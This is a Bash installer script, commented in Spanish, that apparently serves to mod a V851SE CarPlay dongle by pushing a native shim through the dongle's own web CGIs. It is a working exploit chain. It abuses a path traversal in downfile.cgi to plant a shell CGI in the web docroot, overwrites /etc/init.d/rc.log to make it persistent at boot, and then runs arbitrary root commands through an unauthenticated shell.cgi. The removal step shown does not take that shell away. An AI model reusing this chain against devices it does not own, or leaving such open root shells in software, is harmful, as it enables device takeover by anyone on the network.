#!/bin/bash
# Instalador del cuadro CarPlay (Type 111) para dongles CarPlay V851SE que
# lleven el firmware de referencia (se comprueban los MD5 de las tres librerias
# antes de tocar nada).
#
#   ./install.sh            instala (o dice que ya esta) y verifica
#   ./install.sh status     que hay ahora en el aparato
#   ./install.sh remove     lo quita: vuelve al firmware de serie
#   ./install.sh bootstrap  solo deja el canal de root (fase 1)
#
#   DEV=192.168.1.101 ./install.sh install
#
# No hace falta adb ni abrir el aparato: todo va por la web del propio dongle
# (getversion.cgi / downfile.cgi / shell.cgi). La primera vez el dongle no tiene
# canal de root, asi que el script deja un arranque de un solo uso en
# /etc/init.d/rc.log y pide un ciclo de corriente; despues sigue solo.
set -u
export MSYS_NO_PATHCONV=1

DEV=${DEV:-192.168.1.101}
BASE="http://$DEV"
HERE=$(cd "$(dirname "$0")" && pwd)
PAY="$HERE/payload"
CGI="$BASE/cgi-bin/shell.cgi"
UP="$BASE/cgi-bin/downfile.cgi"
TRAV="../../../../etc/shttpd"      # downfile.cgi escribe en /mnt/UDISK/swupdate

note() { echo "$*"; }
die() { echo "ERROR: $*" >&2; exit 1; }
win() { cygpath -w "$1" 2>/dev/null || printf '%s' "$1"; }

md5_file() {
    if command -v md5sum >/dev/null 2>&1; then
        md5sum "$1" | awk '{print $1}'
    else
        certutil -hashfile "$(win "$1")" MD5 | sed -n 2p | tr -d ' \r'
    fi
}
md5_stdin() {
    if command -v md5sum >/dev/null 2>&1; then
        md5sum | awk '{print $1}'
    else
        local t; t=$(mktemp); cat >"$t"; md5_file "$t"; rm -f "$t"
    fi
}
size_of() { wc -c <"$1" | tr -d ' '; }

alive() { [ "$(curl -s -m 6 -o /dev/null -w '%{http_code}' "$BASE/cgi-bin/getversion.cgi" 2>/dev/null)" = "200" ]; }
root_ok() { curl -s -m 10 "$CGI" 2>/dev/null | grep -q 'Uid:'; }
dcmd() { curl -s -m 120 -G --data-urlencode "cmd=$1" "$CGI" 2>/dev/null | tr -d '\r'; }

# --- canal de subida (downfile.cgi, el mismo que usa su actualizacion) -------
# El CGI no trunca: escribe por trozos y contesta "write data" solo si el trozo
# entro. Los trozos van como .1 y el ultimo cierra con :<md5>.2. Un fichero de
# un solo trozo necesita ademas un trozo final vacio.
send_chunk() {   # <fichero> <ruta-remota-completa>
    local resp
    resp=$(curl -sS -m 60 -F "chunk=@$(win "$1");filename=$2" "$UP" 2>&1 | tr -d '\r')
    case "$resp" in
        *"write data"*) return 0 ;;
        *) return 1 ;;
    esac
}
upload_to() {    # <local> <ruta-remota-sin-sufijo>
    local f=$1 remote=$2 tmp n i part suf empty
    tmp=$(mktemp -d)
    split -b 10240 -d -a 3 "$f" "$tmp/c" || { rm -rf "$tmp"; return 1; }
    n=$(ls "$tmp" | wc -l | tr -d ' ')
    i=0
    for part in "$tmp"/c*; do
        if [ "$i" -eq $((n - 1)) ] && [ "$n" -gt 1 ]; then
            suf=":$(md5_file "$f").2"
        else
            suf=".1"
        fi
        send_chunk "$part" "$remote$suf" || { rm -rf "$tmp"; return 1; }
        i=$((i + 1))
    done
    if [ "$n" -eq 1 ]; then
        empty="$tmp/e"; : >"$empty"
        send_chunk "$empty" "$remote:$(md5_file "$f").2" || { rm -rf "$tmp"; return 1; }
    fi
    rm -rf "$tmp"
    return 0
}

# Sube al docroot, comprobando el md5 en el propio aparato (hace falta el CGI).
push() {         # <local> <nombre-en-/etc/shttpd>
    local f=$1 name=$2 want got try
    [ -f "$f" ] || die "falta $f"
    want=$(md5_file "$f")
    for try in 1 2 3 4 5 6; do
        dcmd "rm -f /etc/shttpd/$name" >/dev/null
        if upload_to "$f" "$TRAV/$name"; then
            got=$(dcmd "md5sum /etc/shttpd/$name" | awk '{print $1}')
            if [ "$got" = "$want" ]; then
                note "   $name  $(size_of "$f") B  md5 $want"
                return 0
            fi
            note "   $name: en el dongle quedo '$got' (intento $try)"
        else
            note "   $name: la subida no confirmo 'write data' (intento $try)"
        fi
        sleep 1
    done
    return 1
}

# --- fase 1: dejar un canal de root en un dongle de serie --------------------
bootstrap() {
    note "== el dongle no tiene canal de root todavia; lo dejo (hace falta un ciclo de corriente)"
    local want got cand i line
    want=$(md5_file "$PAY/shell.txt")
    cand=""
    for i in 1 2 3 4 5 6 7 8; do
        if upload_to "$PAY/shell.txt" "$TRAV/hooksh_$i.sh"; then
            got=$(curl -s -m 20 "$BASE/hooksh_$i.sh" | md5_stdin)
            if [ "$got" = "$want" ]; then
                cand="hooksh_$i.sh"
                break
            fi
            note "   hooksh_$i.sh no coincide ('$got'), pruebo otro nombre"
        else
            note "   hooksh_$i.sh: la subida no confirmo 'write data'"
        fi
    done
    [ -n "$cand" ] || die "no pude dejar el CGI en el docroot del dongle"
    note "   CGI verificado en /$cand"

    # rcS hace "source /etc/init.d/rc.log" en cada arranque: una sola linea que
    # copia el CGI con permisos. Si la linea se sube dos veces, se repite igual.
    line="/bin/sh -c \"cp /etc/shttpd/$cand /etc/shttpd/cgi-bin/shell.cgi; chmod 755 /etc/shttpd/cgi-bin/shell.cgi\""
    printf '%s\n' "$line" >"$HERE/.rc.log"
    i=0
    while [ "$i" -lt 6 ]; do
        i=$((i + 1))
        if upload_to "$HERE/.rc.log" "../../../../etc/init.d/rc.log"; then
            note "   /etc/init.d/rc.log subido (intento $i)"
            break
        fi
        note "   /etc/init.d/rc.log sin confirmar (intento $i), reintento"
        sleep 1
    done
    [ "$i" -lt 6 ] || die "no pude subir /etc/init.d/rc.log"

    note "== desenchufa el dongle del USB y vuelve a enchufarlo (o corta y da corriente)."
    note "   esperando a que vuelva..."
    i=0
    while [ "$i" -lt 60 ]; do
        sleep 4
        if root_ok; then
            note "   canal de root arriba"
            return 0
        fi
        i=$((i + 1))
    done
    die "no aparecio el CGI. Vuelve a ejecutar el script para reintentar; si sigue igual, el arranque no esta leyendo /etc/init.d/rc.log"
}

# --- acciones ---------------------------------------------------------------
do_install() {
    alive || die "el dongle no responde en $BASE (enciendelo y conectate a su wifi)"
    note "== dongle en $BASE: $(curl -s -m 8 "$BASE/cgi-bin/getversion.cgi" 2>/dev/null | tr -d '\r\n' | cut -c1-100)"
    root_ok || bootstrap
    note "== subiendo el shim"
    push "$PAY/native111.so" hk_native111.so || die "no pude subir native111.so"
    push "$PAY/native_start.sh" hk_native_start.sh || die "no pude subir native_start.sh"
    push "$PAY/S11carplay_init.stock" hk_S11carplay_init.stock || die "no pude subir el arranque de serie"
    push "$PAY/device-install.sh" hk_install.sh || die "no pude subir device-install.sh"
    note "== instalando en el aparato"
    dcmd "sh /etc/shttpd/hk_install.sh install"
    echo
    note "== informe del aparato (http://$DEV/install.txt)"
    curl -s -m 15 "$BASE/install.txt" | tr -d '\r'
    echo
    note "Reinicia el dongle (desenchufar y enchufar) para que arranque con el shim."
    note "Despues:  ./install.sh status"
}

do_status() {
    alive || die "el dongle no responde en $BASE"
    if root_ok; then
        dcmd 'echo "== shim instalado"; md5sum /etc/hook/native111.so /etc/hook/native_start.sh 2>&1; echo "== arranque"; grep -n native_start.sh /etc/init.d/S11carplay_init 2>&1; echo "== propiedades"; echo "nosave=$(getprop persist.console.log.nosave)"; echo "== proceso"; pidof sdDongle; echo "== logs"; ls -l /mnt/UDISK/log; echo "== ultimas lineas del shim"; tail -c 500 /mnt/UDISK/hook/native111.log 2>&1'
    else
        note "sin canal de root: dongle de serie (o reiniciado de fabrica)."
        note "Ejecuta  ./install.sh  para instalarlo."
    fi
    echo
    note "== ultimo informe"
    if [ "$(curl -s -m 10 -o /dev/null -w '%{http_code}' "$BASE/install.txt" 2>/dev/null)" = "200" ]; then
        curl -s -m 15 "$BASE/install.txt" | tr -d '\r'
    else
        note "(sin informe: este dongle no ha pasado por este instalador)"
    fi
}

do_remove() {
    alive || die "el dongle no responde en $BASE"
    root_ok || die "hace falta el canal de root (ejecuta ./install.sh primero)"
    push "$PAY/device-install.sh" hk_install.sh || die "no pude subir device-install.sh"
    dcmd "sh /etc/shttpd/hk_install.sh remove"
    echo
    note "Reinicia el dongle para que arranque de serie."
}

case "${1:-install}" in
    install)   do_install ;;
    status)    do_status ;;
    remove)    do_remove ;;
    bootstrap) alive || die "el dongle no responde en $BASE"; root_ok || bootstrap; note "canal de root listo" ;;
    *) sed -n '2,20p' "$0"; exit 2 ;;
esac
